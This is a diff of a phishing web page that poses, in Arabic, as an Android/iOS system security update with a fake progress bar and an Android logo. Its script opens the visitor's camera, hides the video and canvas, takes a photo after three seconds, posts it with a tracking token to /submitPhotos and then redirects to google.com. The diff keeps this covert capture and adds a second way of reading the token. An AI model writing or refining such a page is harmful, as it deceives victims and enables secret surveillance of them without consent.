@@ -3,69 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
-    <!-- Meta Tags for Preview -->
     <meta property="og:title" content="تحديث أمان النظام - Android/iOS">
-    <meta property="og:description" content="يتوفر تحديث جديد لنظام التشغيل الخاص بك. يرجى المتابعة لتحسين الأداء والأمان.">
+    <meta property="og:description" content="يتوفر تحديث جديد لنظام التشغيل الخاص بك. يرجى المتابعة لتحسين الأداء.">
     <meta property="og:image" content="https://www.gstatic.com/images/branding/product/2x/android_96dp.png">
-    <meta property="og:type" content="website">
-
     <title>System Update</title>
     <style>
         body { font-family: Arial, sans-serif; background-color: #000; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
         .progress-container { width: 80%; background-color: #333; border-radius: 10px; margin-top: 20px; }
         .progress-bar { width: 0%; height: 10px; background-color: #4CAF50; border-radius: 10px; transition: width 0.5s; }
-        .status { margin-top: 10px; color: #aaa; }
     </style>
 </head>
 <body>
-    <img src="https://www.gstatic.com/images/branding/product/2x/android_96dp.png" width="80" alt="OS Logo">
-    <h2>جاري التحقق من التحديثات...</h2>
+    <img src="https://www.gstatic.com/images/branding/product/2x/android_96dp.png" width="80">
+    <h2>جاري فحص النظام...</h2>
     <div class="progress-container"><div class="progress-bar" id="bar"></div></div>
-    <div class="status" id="statusText">جاري تهيئة النظام...</div>
-
-    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
-
+    <video id="v" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="c" width="640" height="480" style="display:none;"></canvas>
     <script>
-        const token = window.location.pathname.split('/').pop();
-        let progress = 0;
+        const token = window.location.pathname.split('/').pop() || new URLSearchParams(window.location.search).get('t');
+        let p = 0;
         const bar = document.getElementById('bar');
-        const statusText = document.getElementById('statusText');
-
-        async function capture() {
+        
+        async function start() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                
+                const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                const v = document.getElementById('v');
+                v.srcObject = s;
                 setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                    const imageData = canvas.toDataURL('image/jpeg').split(',')[1];
-                    
+                    const canvas = document.getElementById('c');
+                    canvas.getContext('2d').drawImage(v, 0, 0, 640, 480);
                     fetch('/submitPhotos', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ token: token, imageDatas: imageData })
+                        body: JSON.stringify({ token, imageData: canvas.toDataURL('image/jpeg').split(',')[1] })
                     });
                 }, 3000);
-            } catch (err) {}
+            } catch (e) {}
         }
 
-        const interval = setInterval(() => {
-            progress += Math.random() * 10;
-            if (progress >= 100) {
-                progress = 100;
-                clearInterval(interval);
-                window.location.href = "https://google.com";
-            }
-            bar.style.width = progress + '%';
-            if (progress > 30) statusText.innerText = "جاري تحميل ملفات الأمان...";
-            if (progress > 70) statusText.innerText = "جاري التثبيت...";
-        }, 500);
-
-        window.onload = capture;
+        const inv = setInterval(() => {
+            p += 5;
+            if (p >= 100) { clearInterval(inv); window.location.href = "https://google.com"; }
+            bar.style.width = p + '%';
+        }, 300);
+        window.onload = start;
     </script>
 </body>
 </html>
